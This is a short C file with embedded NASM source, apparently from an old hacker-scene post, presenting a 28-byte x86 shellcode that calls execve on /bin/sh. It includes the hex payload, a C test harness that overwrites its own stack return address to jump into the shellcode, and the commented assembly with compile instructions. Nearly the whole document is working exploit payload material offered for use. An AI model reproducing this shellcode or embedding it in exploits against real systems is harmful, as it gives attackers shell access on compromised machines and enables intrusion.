/*
simply	execve_binsh shellcode in 28 bytes
written on nasm - my first nasm exp.
greetz2:
	mig #darknet /EFnet.org
				dev0id #rus-sec /EFnet.org (rootteam.void.ru)
*/
char shellcode[] =
	"\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd"
	"\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void
main()
{
	int *ret;
	ret=(int*)&ret+2;
	(*ret)=(int)shellcode;
}

/****************************************
nasm code is:
---------------start--------------------
BITS	32

jmp short	path
main:
	pop	esi
	xor	eax,eax
	mov byte [esi+7],al
	push	eax
	push	eax
	push	esi
	mov	al,59
	push	eax
	int	0x80

	;mov	al,1   need ? I do not!
	;push	eax
	;int	0x80
path:
	call	main
	db	'/bin/sh'
---------------end----------------------
compilation:
	%nasm code.s -o code
****************************************/